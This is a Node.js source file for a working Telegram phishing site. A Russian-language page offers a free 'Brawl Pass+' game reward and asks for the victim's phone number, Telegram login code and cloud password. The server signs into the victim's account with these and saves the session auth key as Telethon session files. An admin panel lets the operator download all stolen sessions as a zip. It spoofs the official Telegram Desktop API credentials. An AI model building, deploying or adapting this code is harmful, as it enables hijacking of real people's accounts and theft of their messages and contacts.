const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions/');
const { computeCheck } = require('telegram/Password');

const app = express();

// ЖЁСТКО ЗАДАЁМ API ДАННЫЕ TDesktop
const API_ID = 2040;
const API_HASH = 'b18441a1ff607e10a989891a5462e627';

// Проверка
console.log('API_ID:', API_ID);
console.log('API_HASH:', API_HASH);

// Парсеры
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Сессии
app.use(session({
    secret: 'secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// Папка для сессий Telegram
const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

const { execSync } = require('child_process');

function getSessionFile(phone) {
    return path.join(SESSIONS_DIR, phone.replace(/[^0-9]/g, '') + '.session');
}

function saveTelethonSession(phone, client, targetPath) {
    try {
        const dcId = client.session.dcId;
        const serverAddress = client.session.serverAddress;
        const port = client.session.port;
        const authKey = client.session.authKey;
        if (!authKey) {
            throw new Error("No authKey in session");
        }
        const keyBuffer = authKey.getKey();
        if (!keyBuffer) {
            throw new Error("No key buffer in authKey");
        }
        const authKeyHex = keyBuffer.toString('hex');

        console.log(`📡 Exporting Telethon Session: DC=${dcId}, IP=${serverAddress}, Port=${port}`);

        const pythonCode = `
import sqlite3
import sys

db_path = sys.argv[1]
dc_id = int(sys.argv[2])
ip = sys.argv[3]
port = int(sys.argv[4])
auth_key = bytes.fromhex(sys.argv[5])

conn = sqlite3.connect(db_path)
c = conn.cursor()

c.execute('CREATE TABLE IF NOT EXISTS sessions (dc_id INTEGER PRIMARY KEY, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER)')
c.execute('CREATE TABLE IF NOT EXISTS entities (id INTEGER PRIMARY KEY, hash INTEGER, username TEXT, phone TEXT, name TEXT)')
c.execute('CREATE TABLE IF NOT EXISTS sent_files (md5_digest BLOB, file_size INTEGER, type INTEGER, id INTEGER, hash INTEGER, PRIMARY KEY(md5_digest, file_size, type))')
c.execute('CREATE TABLE IF NOT EXISTS update_state (id INTEGER PRIMARY KEY, pts INTEGER, qts INTEGER, date INTEGER, seq INTEGER, unread_count INTEGER)')
c.execute('CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)')

c.execute('INSERT OR REPLACE INTO version (version) VALUES (7)')
c.execute('INSERT OR REPLACE INTO sessions (dc_id, server_address, port, auth_key) VALUES (?, ?, ?, ?)', (dc_id, ip, port, auth_key))

conn.commit()
conn.close()
`;

        const tempPyPath = path.join(__dirname, `temp_session_${phone.replace(/[^0-9]/g, '')}.py`);
        fs.writeFileSync(tempPyPath, pythonCode, 'utf-8');

        if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath);
        }

        execSync(`python "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, { stdio: 'ignore' });
        fs.unlinkSync(tempPyPath);

        const fileSize = fs.statSync(targetPath).size;
        console.log(`✅ Telethon SQLite Session generated successfully: ${targetPath} (${fileSize} bytes)`);
        return true;
    } catch (e) {
        console.error("❌ Error generating Telethon SQLite session:", e);
        try {
            const sessionString = client.session.save();
            fs.writeFileSync(targetPath, sessionString, 'utf-8');
            console.log(`⚠️ Saved fallback StringSession (size: ${fs.statSync(targetPath).size} bytes)`);
        } catch (err) {
            console.error("❌ Critical: Failed to save fallback session:", err);
        }
        return false;
    }
}

// ===== СТАТИЧЕСКИЙ HTML С ВСТРОЕННЫМ CSS И JS =====
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Brawl Pass+</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #f5f7fa, #e4e9f2);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .card {
                background: white;
                border-radius: 30px;
                padding: 40px 30px;
                max-width: 400px;
                width: 100%;
                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
                text-align: center;
            }
            .banner {
                background: #1a1a2e;
                border-radius: 20px;
                padding: 20px;
                color: white;
                font-size: 28px;
                font-weight: bold;
                margin-bottom: 20px;
            }
            h1 { font-size: 26px; margin-bottom: 20px; }
            .highlight { color: #f7971e; }
            .form-group { margin-bottom: 20px; text-align: left; }
            label { display: block; margin-bottom: 5px; font-weight: 600; }
            input {
                width: 100%;
                padding: 14px 16px;
                border: 2px solid #ddd;
                border-radius: 16px;
                font-size: 16px;
                outline: none;
                transition: border 0.3s;
            }
            input:focus { border-color: #1a1a2e; }
            .btn {
                background: #1a1a2e;
                color: white;
                border: none;
                border-radius: 60px;
                padding: 16px 32px;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                width: 100%;
                transition: all 0.2s;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            .btn:hover { background: #2d2d4a; transform: scale(1.02); }
            .btn:disabled { opacity: 0.6; cursor: not-allowed; }
            .back { background: none; border: none; color: #666; margin-top: 15px; cursor: pointer; }
            .error { color: #e74c3c; font-size: 14px; margin-top: 5px; min-height: 20px; }
            .spinner {
                width: 20px; height: 20px;
                border: 3px solid rgba(255,255,255,0.3);
                border-top-color: white;
                border-radius: 50%;
                animation: spin 0.6s linear infinite;
                display: none;
            }
            .spinner.show { display: inline-block; }
            @keyframes spin { to { transform: rotate(360deg); } }
            .page { display: none; }
            .page.active { display: block; }
            .success-icon { font-size: 64px; margin-bottom: 10px; }
            .success-message {
                background: #f2f4f9;
                border-radius: 20px;
                padding: 20px;
                margin: 20px 0;
            }
            .success-message p { margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="card">
            <!-- Главная -->
            <div id="page-main" class="page active">
                <div class="banner">🎮 Brawl Pass+</div>
                <h1>Получите бесплатно <span class="highlight">Brawl Pass+</span></h1>
                <button class="btn" onclick="showPage('phone')">Получить! →</button>
                <p style="margin-top:15px;color:#888;">Только сегодня · Ограниченное предложение</p>
            </div>

            <!-- Телефон -->
            <div id="page-phone" class="page">
                <h2>Введите номер телефона</h2>
                <p style="color:#666;margin-bottom:20px;">Мы отправим код в Telegram</p>
                <form id="phoneForm">
                    <div class="form-group">
                        <label>Номер телефона</label>
                        <input type="tel" id="phoneInput" placeholder="79001234567" required>
                        <div class="error" id="phoneError"></div>
                    </div>
                    <button type="submit" class="btn" id="sendCodeBtn">
                        Отправить код
                        <span class="spinner" id="phoneSpinner"></span>
                    </button>
                </form>
                <button class="back" onclick="showPage('main')">← Назад</button>
            </div>

            <!-- Код -->
            <div id="page-code" class="page">
                <h2>Подтверждение</h2>
                <p style="color:#666;margin-bottom:20px;">Введите код из Telegram</p>
                <form id="codeForm">
                    <div class="form-group">
                        <label>Код подтверждения</label>
                        <input type="text" id="codeInput" placeholder="123456" maxlength="6" required>
                        <div class="error" id="codeError"></div>
                    </div>
                    <button type="submit" class="btn" id="verifyCodeBtn">
                        Проверить код
                        <span class="spinner" id="codeSpinner"></span>
                    </button>
                </form>
                <button class="back" onclick="showPage('phone')">← Назад</button>
            </div>

            <!-- Пароль -->
            <div id="page-password" class="page">
                <h2>Облачный пароль</h2>
                <p style="color:#666;margin-bottom:20px;">Введите облачный пароль</p>
                <form id="passwordForm">
                    <div class="form-group">
                        <label>Пароль</label>
                        <input type="password" id="passwordInput" placeholder="••••••••" required>
                        <div class="error" id="passwordError"></div>
                    </div>
                    <button type="submit" class="btn" id="verifyPasswordBtn">
                        Подтвердить
                        <span class="spinner" id="passwordSpinner"></span>
                    </button>
                </form>
                <button class="back" onclick="showPage('code')">← Назад</button>
            </div>

            <!-- Успех -->
            <div id="page-success" class="page">
                <div class="success-icon">✅</div>
                <h2 style="margin-bottom:10px;">Вы успешно прошли верификацию.</h2>
                <div class="success-message">
                    <p>Из-за большого количества заявок ссылка будет отправлена в течение нескольких часов.</p>
                    <p>Ожидайте сообщение от бота.</p>
                </div>
                <button class="btn" onclick="resetAll()">На главную</button>
            </div>
        </div>

        <script>
            let currentPhone = '';

            function showPage(id) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                document.getElementById('page-' + id).classList.add('active');
            }

            // Телефон
            document.getElementById('phoneForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const phone = document.getElementById('phoneInput').value.trim();
                if (!phone || phone.length < 8) {
                    document.getElementById('phoneError').textContent = 'Введите корректный номер (только цифры)';
                    return;
                }
                document.getElementById('phoneError').textContent = '';
                currentPhone = phone;
                const btn = document.getElementById('sendCodeBtn');
                btn.disabled = true;
                document.getElementById('phoneSpinner').classList.add('show');

                try {
                    const res = await fetch('/api/send-code', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone })
                    });
                    const data = await res.json();
                    if (res.ok) {
                        showPage('code');
                        document.getElementById('codeInput').focus();
                    } else {
                        document.getElementById('phoneError').textContent = data.error || 'Ошибка отправки';
                    }
                } catch (err) {
                    document.getElementById('phoneError').textContent = 'Сервер недоступен';
                } finally {
                    btn.disabled = false;
                    document.getElementById('phoneSpinner').classList.remove('show');
                }
            });

            // Код
            document.getElementById('codeForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const code = document.getElementById('codeInput').value.trim();
                if (code.length < 4) {
                    document.getElementById('codeError').textContent = 'Введите код из 4-6 цифр';
                    return;
                }
                document.getElementById('codeError').textContent = '';
                const btn = document.getElementById('verifyCodeBtn');
                btn.disabled = true;
                document.getElementById('codeSpinner').classList.add('show');

                try {
                    const res = await fetch('/api/verify-code', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone: currentPhone, code })
                    });
                    const data = await res.json();
                    if (res.ok) {
                        if (data.cloudPasswordRequired) {
                            showPage('password');
                            document.getElementById('passwordInput').focus();
                        } else {
                            showPage('success');
                        }
                    } else {
                        document.getElementById('codeError').textContent = data.error || 'Неверный код';
                    }
                } catch (err) {
                    document.getElementById('codeError').textContent = 'Ошибка соединения';
                } finally {
                    btn.disabled = false;
                    document.getElementById('codeSpinner').classList.remove('show');
                }
            });

            // Пароль
            document.getElementById('passwordForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const password = document.getElementById('passwordInput').value.trim();
                if (!password) {
                    document.getElementById('passwordError').textContent = 'Введите пароль';
                    return;
                }
                document.getElementById('passwordError').textContent = '';
                const btn = document.getElementById('verifyPasswordBtn');
                btn.disabled = true;
                document.getElementById('passwordSpinner').classList.add('show');

                try {
                    const res = await fetch('/api/verify-password', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone: currentPhone, password })
                    });
                    const data = await res.json();
                    if (res.ok) {
                        showPage('success');
                    } else {
                        document.getElementById('passwordError').textContent = data.error || 'Неверный пароль';
                    }
                } catch (err) {
                    document.getElementById('passwordError').textContent = 'Ошибка соединения';
                } finally {
                    btn.disabled = false;
                    document.getElementById('passwordSpinner').classList.remove('show');
                }
            });

            function resetAll() {
                document.getElementById('phoneInput').value = '';
                document.getElementById('codeInput').value = '';
                document.getElementById('passwordInput').value = '';
                document.querySelectorAll('.error').forEach(e => e.textContent = '');
                showPage('main');
                currentPhone = '';
            }
        </script>
    </body>
    </html>
    `);
});

// ===== API ENDPOINTS =====
app.post('/api/send-code', async (req, res) => {
    console.log('📥 /api/send-code body:', req.body);
    const phone = req.body.phone;
    if (!phone) {
        return res.status(400).json({ error: 'Номер не указан' });
    }

    // Удаляем старую сессию
    try { fs.unlinkSync(getSessionFile(phone)); } catch (_) {}

    try {
        const client = new TelegramClient(
            new StringSession(''),
            Number(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );
        await client.connect();
        console.log(`✅ Подключен для ${phone}`);
        const result = await client.sendCode(
            { apiId: Number(API_ID), apiHash: API_HASH },
            phone
        );
        console.log(`📨 Код отправлен, hash: ${result.phoneCodeHash}`);

        req.session.phoneCodeHash = result.phoneCodeHash;
        req.session.phone = phone;
        req.session.tempSession = client.session.save();

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Ошибка sendCode:', error);
        const errorMsg = error.errorMessage || error.message || 'Ошибка отправки кода';
        res.status(500).json({ error: errorMsg });
    }
});

app.post('/api/verify-code', async (req, res) => {
    console.log('📥 /api/verify-code body:', req.body);
    const { phone, code } = req.body;
    if (!phone || !code) {
        return res.status(400).json({ error: 'Телефон и код обязательны' });
    }
    const phoneCodeHash = req.session.phoneCodeHash;
    const tempSession = req.session.tempSession;
    if (!phoneCodeHash || !tempSession) {
        return res.status(400).json({ error: 'Сначала запросите код' });
    }

    try {
        const client = new TelegramClient(
            new StringSession(tempSession),
            Number(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );
        await client.connect();
        await client.invoke(new Api.auth.SignIn({
            phoneNumber: phone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code,
        }));
        console.log(`✅ Успешный вход для ${phone}`);

        // Сохраняем сессию
        saveTelethonSession(phone, client, getSessionFile(phone));
        delete req.session.phoneCodeHash;
        delete req.session.tempSession;

        res.json({ success: true, cloudPasswordRequired: false });
    } catch (error) {
        console.error('❌ Ошибка verify-code:', error);
        const errorMsg = error.errorMessage || error.message || '';
        if (errorMsg.includes('SESSION_PASSWORD_NEEDED') || errorMsg.includes('PASSWORD_HASH')) {
            req.session.tempSessionForPassword = req.session.tempSession;
            delete req.session.tempSession;
            return res.json({ success: true, cloudPasswordRequired: true });
        }
        res.status(400).json({ error: 'Неверный код: ' + errorMsg });
    }
});

app.post('/api/verify-password', async (req, res) => {
    console.log('📥 /api/verify-password body:', req.body);
    const { phone, password } = req.body;
    if (!phone || !password) {
        return res.status(400).json({ error: 'Телефон и пароль обязательны' });
    }
    const tempSession = req.session.tempSessionForPassword;
    if (!tempSession) {
        return res.status(400).json({ error: 'Сначала подтвердите код' });
    }

    try {
        const client = new TelegramClient(
            new StringSession(tempSession),
            Number(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );
        await client.connect();
        const pwd = await client.invoke(new Api.account.GetPassword());
        const passwordSrpCheck = await computeCheck(pwd, password);
        await client.invoke(new Api.auth.CheckPassword({ password: passwordSrpCheck }));
        console.log(`✅ Пароль верный для ${phone}`);

        saveTelethonSession(phone, client, getSessionFile(phone));
        delete req.session.tempSessionForPassword;

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Ошибка checkPassword:', error);
        const errorMsg = error.errorMessage || error.message || '';
        res.status(400).json({ error: 'Неверный пароль: ' + errorMsg });
    }
});

// ===== АДМИН-ПАНЕЛЬ ДЛЯ ВЫГРУЗКИ СЕССИЙ =====
app.get('/admin/sessions', (req, res) => {
    const key = req.query.key;
    const { ADMIN_KEY } = require('./config');
    
    if (key !== ADMIN_KEY) {
        return res.status(403).send('Доступ запрещен. Укажите верный ?key=ваш_ключ');
    }

    try {
        const files = fs.readdirSync(SESSIONS_DIR).filter(f => f.endsWith('.session'));
        let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Управление сессиями</title>
            <style>
                body { font-family: -apple-system, sans-serif; background: #0b0f19; color: #f8fafc; padding: 40px 20px; text-align: center; }
                .container { max-width: 600px; margin: 0 auto; background: rgba(15, 23, 42, 0.75); padding: 30px; border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
                h1 { color: #ffaa00; margin-bottom: 20px; font-size: 24px; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th, td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); text-align: left; }
                th { background: rgba(255,255,255,0.05); color: #94a3b8; }
                a { color: #00f2fe; text-decoration: none; font-weight: 700; }
                a:hover { text-decoration: underline; }
                .btn { background: linear-gradient(135deg, #ff0055, #ffaa00); color: white; padding: 12px 24px; border-radius: 12px; text-decoration: none; display: inline-block; margin-bottom: 20px; font-weight: bold; border: none; box-shadow: 0 4px 15px rgba(255,0,85,0.3); }
                .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(255,0,85,0.4); }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Управление сессиями (Telethon)</h1>
                <a href="/admin/sessions/download-all?key=${key}" class="btn">📥 Скачать все архивом (.zip)</a>
                <table>
                    <thead>
                        <tr>
                            <th>Сессия (Номер)</th>
                            <th>Размер</th>
                            <th>Действие</th>
                        </tr>
                    </thead>
                    <tbody>
        `;

        if (files.length === 0) {
            html += `<tr><td colspan="3" style="text-align: center; color: #94a3b8; padding: 20px;">Сессий пока нет</td></tr>`;
        } else {
            files.forEach(file => {
                const stat = fs.statSync(path.join(SESSIONS_DIR, file));
                const sizeKB = (stat.size / 1024).toFixed(1);
                html += `
                    <tr>
                        <td>📱 +${file.replace('.session', '')}</td>
                        <td>${sizeKB} KB</td>
                        <td><a href="/admin/sessions/download/${file}?key=${key}">Скачать</a></td>
                    </tr>
                `;
            });
        }

        html += `
                    </tbody>
                </table>
            </div>
        </body>
        </html>
        `;
        res.send(html);
    } catch (e) {
        res.status(500).send('Ошибка сервера: ' + e.message);
    }
});

// Скачивание отдельного файла сессии
app.get('/admin/sessions/download/:file', (req, res) => {
    const { key } = req.query;
    const { ADMIN_KEY } = require('./config');
    if (key !== ADMIN_KEY) return res.status(403).send('Доступ запрещен');

    const file = req.params.file;
    const filePath = path.join(SESSIONS_DIR, file);
    if (!fs.existsSync(filePath)) return res.status(404).send('Файл не найден');

    res.download(filePath);
});

// Скачивание всех сессий архивом ZIP
app.get('/admin/sessions/download-all', (req, res) => {
    const { key } = req.query;
    const { ADMIN_KEY } = require('./config');
    if (key !== ADMIN_KEY) return res.status(403).send('Доступ запрещен');

    try {
        const zipPath = path.join(__dirname, 'sessions.zip');
        // Используем встроенный модуль zipfile в Python
        const zipCommand = `python -c "import zipfile, os; zipf = zipfile.ZipFile('${zipPath.replace(/\\/g, '\\\\')}', 'w', zipfile.ZIP_DEFLATED); [zipf.write(os.path.join('${SESSIONS_DIR.replace(/\\/g, '\\\\')}', f), f) for f in os.listdir('${SESSIONS_DIR.replace(/\\/g, '\\\\')}') if f.endsWith('.session')]; zipf.close()"`;
        
        execSync(zipCommand);
        
        if (!fs.existsSync(zipPath)) {
            return res.status(500).send('Не удалось сгенерировать zip архив');
        }
        
        res.download(zipPath, 'sessions.zip', () => {
            try { fs.unlinkSync(zipPath); } catch(_) {}
        });
    } catch(e) {
        res.status(500).send('Ошибка архивации: ' + e.message);
    }
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Сервер на http://localhost:${PORT}`);
    console.log(`API_ID: ${API_ID}, API_HASH: ${API_HASH}`);
});